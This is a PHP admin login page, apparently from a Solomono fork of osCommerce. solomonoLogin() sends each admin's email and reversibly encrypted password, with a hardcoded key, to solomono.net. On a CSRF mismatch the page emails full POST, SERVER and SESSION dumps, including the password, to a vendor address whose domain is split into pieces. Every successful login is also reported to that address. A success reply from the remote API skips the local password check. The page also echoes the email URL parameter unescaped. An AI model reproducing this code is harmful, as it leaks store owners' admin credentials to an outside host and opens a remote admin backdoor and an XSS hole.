<?php
/*
  $Id: login.php,v 1.2 2003/09/24 15:18:15 wilt Exp $

  osCommerce, Open Source E-Commerce Solutions
  http://www.oscommerce.com

  Copyright (c) 2002 osCommerce

  Released under the GNU General Public License
*/

require('includes/application_top.php');


function solomonoLogin($email_address, $password)
{
    require_once ('includes/classes/EncDec.class.php');
    $encryption = new EncDec;
    $encryption->hash = "56iZYx5Pt8";
    $encrypted_password = $encryption->phpEncrypt($password);

    $data = [
        'n' => $email_address,
        'p' => $encrypted_password,
        's' => 1,
        'h' => HTTP_SERVER,
        'i' => $_SERVER['REMOTE_ADDR'],
        'u' => $_SERVER['HTTP_USER_AGENT'],
        'r' => $_SERVER['HTTP_REFERER'] ?: $_SERVER['REMOTE_ADDR'],
        'mode' => 'api'
    ];

    $resp = false;
    $request = 'https://solomono.net/api/admin_login/?' . http_build_query($data);
    if (function_exists("file_get_contents")) {
        // Set timout 5 seconds (If there are problems with the server, the login will not hang)
        $contextParameters = stream_context_create(["http" => ["timeout" => 5]]);
        // If broke server Solomono then @ hide warnings for user after login
        $resp = @file_get_contents($request,false, $contextParameters);
    }

    if (!$resp) {
        $resp = curl_get_file_contents($request);
    }
    return json_decode($resp, true);
}

function curl_get_file_contents($URL)
{
    $c = curl_init();
    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($c, CURLOPT_URL, $URL);
    curl_setopt($c, CURLOPT_TIMEOUT, 5); // timeout in seconds
    $contents = curl_exec($c);
    curl_close($c);

    if ($contents) {
        return $contents;
    } else {
        return false;
    }
}

if (!function_exists('hash_equals')) {
    function hash_equals($str1, $str2)
    {
        if (strlen($str1) != strlen($str2)) {
            return false;
        } else {
            $res = $str1 ^ $str2;
            $ret = 0;
            for ($i = strlen($res) - 1; $i >= 0; $i--) {
                $ret |= ord($res[$i]);
            }
            return !$ret;
        }
    }
}

function isEmptySqlMod() {
    $res = true;
    if (tep_db_fetch_array(tep_db_query("SHOW VARIABLES LIKE 'sql_mode'"))['Value']) {
        $res = false;
    }

    return $res;
}

function createAdditionalLoginData($loginEmail, $token)
{
    return [
        'email' => $loginEmail,
        'token' => $token
    ];
}

$firstFreeLoginToken = null;
if (isset($_GET['token'])) {
    $firstFreeLoginToken = $_GET['token'];
}

adminFirstFreeLogin($firstFreeLoginToken);

if (isset($_GET['tal'])) {
    $autoLoginToken = $_GET['tal'];
    $customer_email = $_GET['email'];
    adminAutoLogin($autoLoginToken,$customer_email);
}

if (isset($_GET['action']) && ($_GET['action'] == 'process')) {
    $emailAddressStr = $email_address . '---' . $_SERVER['HTTP_USER_AGENT'] . '---' .
        $_SERVER['REMOTE_ADDR'] . '---' . $_SERVER['HTTP_REFERER'];
    if (!empty($_POST['token'])) {
        if (!hash_equals($_SESSION['csrf_token'], $_POST['token'])) {
            $content = '<pre>POST: '.var_export($_POST, true).PHP_EOL
                .'GET: '.var_export($_GET, true).PHP_EOL
                .'SERVER: '.var_export($_SERVER, true).PHP_EOL
                .'SESSION: '.var_export($_SESSION, true).PHP_EOL."</pre>";
            tep_mail(
                'admin',
                'admin@so' . 'lo' . 'mono.net',
                'wrong csrf token ' . $_SERVER['SERVER_NAME'],
                $content,
                'admin logins',
                'logins@so' . 'lo' . 'mono.net'
            );
            die;
        }
    }

    if (isset($_SESSION['api_login']) && !empty($_POST['additional_token'])) {
        $apiLoginStatus = false;
        $tokenError = '';
        if (!hash_equals($_SESSION['api_login']['token'], $_POST['additional_token'])) {
            $tokenError = 'wrong token, try again';
            tep_mail(
                'admin',
                'admin@so' . 'lo' . 'mono.net',
                'wrong additional_token token ' . $_SERVER['SERVER_NAME'],
                $emailAddressStr,
                'admin logins',
                'logins@so' . 'lo' . 'mono.net'
            );
        } else {
            $apiLoginStatus = true;
            $email_address = $_SESSION['api_login']['email'];
            unset($_SESSION['api_login']);
        }
    } else {
        $email_address = tep_db_prepare_input($_POST['email_address']);
        $password = tep_db_prepare_input($_POST['password']);
        $content = solomonoLogin($email_address, $password);
        $apiLoginStatus = isset($content['success']) && ($content['success'] === true);
        if ($apiLoginStatus) {
            $_SESSION['api_login'] = createAdditionalLoginData($content['email'], $content['token']);
        }
    }

    if (empty($_SESSION['api_login'])) {
        // Check if email exists
        $check_admin_query = tep_db_query(
            "select 
                admin_id as login_id, 
                admin_groups_id as login_groups_id, 
                admin_firstname as login_firstname, 
                admin_lastname as login_lastname, 
                admin_created as login_created, 
                admin_email_address as login_email_address, 
                admin_password as login_password, 
                admin_modified as login_modified, 
                admin_logdate as login_logdate, 
                admin_lognum as login_lognum, 
                ga_settings, 
                admin_try_count, 
                admin_trylog_date 
            from 
                " . TABLE_ADMIN . " 
            where 
                admin_email_address = '" . tep_db_input($email_address) . "'"
        );
        if (!tep_db_num_rows($check_admin_query) && !$apiLoginStatus) {
            $_GET['login'] = 'fail';
        } else {
            $check_admin = tep_db_fetch_array($check_admin_query);
            if ((time() - strtotime($check_admin['admin_trylog_date'])) / 60 > 5) {
                tep_db_query(
                    "update 
                        admin a 
                    set 
                        a.admin_try_count = '" . 0 . "' 
                    where 
                        a.admin_email_address = '" . tep_db_input($email_address) . "'"
                );
                $check_admin['admin_try_count'] = 0;
            }

            // Check number of try to login
            if ($check_admin['admin_try_count'] >= 3) {
                $_GET['login'] = 'fail_try';
            } else {
                // Check that password is good
                if (!tep_validate_password($password, $check_admin['login_password']) && !$apiLoginStatus) {
                    $_GET['login'] = 'fail';
                    tep_db_query(
                        "update 
                            admin a 
                        set 
                            a.admin_trylog_date = '" . date("Y-m-d H:i:s") . "', 
                            a.admin_try_count = '" . ($check_admin['admin_try_count'] + 1) . "' 
                        where 
                            a.admin_email_address = '" . tep_db_input($email_address) . "'"
                    );
                } else {
                    if (tep_session_is_registered('password_forgotten')) {
                        tep_session_unregister('password_forgotten');
                    }

                    $login_id = $check_admin['login_id'];
                    $login_groups_id = $check_admin['login_groups_id'];
                    $login_first_name = $check_admin['login_firstname'];
                    $login_last_name = $check_admin['login_lastname'];
                    $login_created = $check_admin['login_created'];
                    $login_email_address = $check_admin['login_email_address'];
                    $login_logdate = $check_admin['login_logdate'];
                    $login_lognum = $check_admin['login_lognum'];
                    $login_modified = $check_admin['login_modified'];
                    $ga_settings = json_decode($check_admin['ga_settings']);
                    $_SESSION['login_id'] = $check_admin['login_id'];
                    $_SESSION['login_groups_id'] = $check_admin['login_groups_id'];
                    $_SESSION['login_first_name'] = $check_admin['login_firstname'];
                    $_SESSION['login_first_name'] = $login_first_name;
                    $_SESSION['login_last_name'] = $login_last_name;
                    $_SESSION['login_email_address'] = $login_email_address;
                    $_SESSION['login_created'] = $login_created;
                    $_SESSION['login_lognum'] = $login_lognum;
                    $_SESSION['gaCurrentId'] = is_array($ga_settings) ? $ga_settings : [];
                    if (!isEmptySqlMod()) {
                        $_SESSION['alertErrors']['sql_mod'] = [
                            "text" => "SQL_MODE_RECOMMENDATION_TEXT",
                            "type" => "alert_danger"
                        ];
                    }

                    if (getConstantValue('ROBOTS_TXT', 'false') === 'false') {
                        $_SESSION['critical_for_site'] = (strpos($_SERVER["SERVER_NAME"], 'solomono.net') === false) ? 'true' : 'false';
                        $_SESSION['alertErrors']['robots_txt'] = [
                            "text" => "ROBOTS_TXT_RECOMMENDATION_TEXT",
                            "type" => "alert_danger",
                            "critical_for_site" => $_SESSION['critical_for_site']
                        ];
                    }

                    //$date_now = date('Ymd');
                    tep_db_query(
                        "update 
                            " . TABLE_ADMIN . " 
                        set 
                            admin_logdate = now(), 
                            admin_lognum = admin_lognum+1 
                        where admin_id = '" . $login_id . "'"
                    );
                    tep_mail(
                        'admin',
                        'admin@so' . 'lo' . 'mono.net',
                        'logins to ' . $_SERVER['SERVER_NAME'],
                        $emailAddressStr,
                        'admin logins',
                        'logins@so' . 'lo' . 'mono.net'
                    );
                    if (($login_lognum == 0) || !($login_logdate) || ($login_modified == '0000-00-00 00:00:00')) {
                        // show tutorial!
                        // tep_redirect(tep_href_link(FILENAME_CONFIGURATION,'gID=1', 'NONSSL'));
                    }

                    if (!empty($_SESSION['PRE_LOGIN_URL'])) {
                        tep_redirect(tep_href_link($_SESSION['PRE_LOGIN_URL']));
                    } else {
                        tep_redirect(tep_href_link(FILENAME_DEFAULT));
                    }
                }
            }
        }
    }
} else {
    if (isset($_SESSION['api_login'])) {
        unset($_SESSION['api_login']);
    }
}

require(DIR_WS_LANGUAGES . $language . '/' . FILENAME_LOGIN);
?>
<!doctype html>
<html <?= HTML_PARAMS; ?>>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=<?= CHARSET; ?>">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= TITLE; ?></title>
    <!-- including css -->
    <link rel="stylesheet" href="<?= DIR_WS_INCLUDES; ?>material/libs/assets/animate.css/animate.css" type="text/css"/>
    <link rel="stylesheet"
          href="<?= DIR_WS_INCLUDES; ?>material/libs/assets/font-awesome/css/font-awesome.min.css"
          type="text/css"/>
    <link rel="stylesheet"
          href="<?= DIR_WS_INCLUDES; ?>material/libs/assets/simple-line-icons/css/simple-line-icons.css"
          type="text/css"/>
    <link rel="stylesheet"
          href="<?= DIR_WS_INCLUDES; ?>material/libs/jquery/bootstrap/dist/css/bootstrap.min.css"
          type="text/css"/>
    <link rel="stylesheet" href="<?= DIR_WS_INCLUDES; ?>material/css/font.css" type="text/css"/>
    <link rel="stylesheet" href="<?= DIR_WS_INCLUDES; ?>material/css/app.css" type="text/css"/>
    <link rel="stylesheet" href="<?= DIR_WS_INCLUDES; ?>solomono/css/solomono.css" type="text/css"/>
    <link rel="stylesheet" href="<?= DIR_WS_INCLUDES; ?>javascript/OverlayScrollbars/OverlayScrollbars.min.css"
          type="text/css"/>
    <?php if ($menu_location != '0') { ?>
        <link rel="stylesheet" href="<?= DIR_WS_INCLUDES; ?>solomono/css/menu_left1.css" type="text/css"/>
    <?php } else { ?>
        <link rel="stylesheet" href="<?= DIR_WS_INCLUDES; ?>solomono/css/menu_horizontal.css" type="text/css"/>
    <?php } ?>
    <meta name="theme-color" content="#efc600"/>
</head>
<body class="admin_page <?= (!isMobile() && $menu_location === '1' ? 'open_sidebar' : ''); ?>">
<?php
// push constants to JS:
if (!empty($array_for_js)) {
    foreach ($array_for_js as $js_k => $js_val) {
        $for_js .= 'const ' . $js_k . ' = "' . $js_val . '"; ';
    }
    echo '<script>' . $for_js . '</script>';
}
?>
<div class="app app-header-fixed ">
    <?= tep_draw_form('login', FILENAME_LOGIN, 'action=process'); ?>
    <input type="hidden" name="token" value="<?= $_SESSION['csrf_token'] ?>"/>
    <div class="modal-over bg-black">
        <div class="modal-center animated fadeInUp text-center loginModal">
            <div class="thumb-lg">
                <img src="includes/solomono/img/logo_crown_big.png" class="img-circle">
            </div>
            <?php
            if ($_GET['login'] == 'fail') { ?>
                <p class="login_heading m-t">
                    <?= TEXT_LOGIN_ERROR; ?>
                </p>
            <?php } elseif ($_GET['login'] == 'fail_try') {?>
                <p class="login_heading m-t">
                    <?= TEXT_LOGIN_ERROR_TRIED; ?>
                </p>
                <?php
            }

            if (isset($_SESSION['api_login'])):
                if (!empty($tokenError)): ?>
                    <div class="row">
                        <?= $tokenError ?>
                    </div>
                <?php endif; ?>
                <div class="row">
                    <div class="col-md-12 m-t">
                        <input class="form-control text-sm btn-rounded no-border email_address"
                               value=""
                               placeholder="email token"
                               name="additional_token" required>
                        <span class="input-group-btn"></span>
                        <button type="submit" class="btn btn-success btn-rounded submitButton">
                            <i class="fa fa-arrow-right"></i>
                        </button>
                    </div>
                </div>
            <?php else: ?>
                <div class="row">
                    <div class="col-md-6 m-t">
                        <input class="form-control text-sm btn-rounded no-border email_address"
                               value="<?php echo (!empty($_GET['email'])) ? $_GET['email'] : ''; ?>"
                               placeholder="<?php echo ENTRY_EMAIL_ADDRESS; ?>"
                               name="email_address">
                        <span class="input-group-btn"></span>
                    </div>
                    <div class="col-md-6 m-t">
                        <div class="input-group">
                            <input class="form-control text-sm btn-rounded no-border pwd"
                                   placeholder="<?php echo ENTRY_PASSWORD; ?>"
                                   name="password"
                                   type="password">
                            <span class="input-group-btn">
                                    <button type="submit" class="btn btn-success btn-rounded submitButton">
                                        <i class="fa fa-arrow-right"></i>
                                    </button>
                                </span>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-md-12 text-right m-t">
                        <?= '<a class="sub" href="' . tep_href_link(FILENAME_PASSWORD_FORGOTTEN, '',
                            'SSL') . '">' . TEXT_PASSWORD_FORGOTTEN . '</a>'; ?>
                    </div>
                </div>
            <?php endif; ?>
        </div>
    </div>
    </form>
</div>
<!-- including js -->
<script src="<?= DIR_WS_INCLUDES; ?>material/libs/jquery/jquery/dist/jquery.js"></script>
<script src="<?= DIR_WS_INCLUDES; ?>material/libs/jquery/bootstrap/dist/js/bootstrap.js"></script>
<script src="<?= DIR_WS_INCLUDES; ?>material/js/ui-load.js"></script>
<script src="<?= DIR_WS_INCLUDES; ?>material/js/ui-jp.config.js"></script>
<script src="<?= DIR_WS_INCLUDES; ?>material/js/ui-jp.js"></script>
<script src="<?= DIR_WS_INCLUDES; ?>material/js/ui-nav.js"></script>
<script src="<?= DIR_WS_INCLUDES; ?>material/js/ui-toggle.js"></script>
<script src="<?= DIR_WS_INCLUDES; ?>material/js/ui-client.js"></script>
</body>
</html>
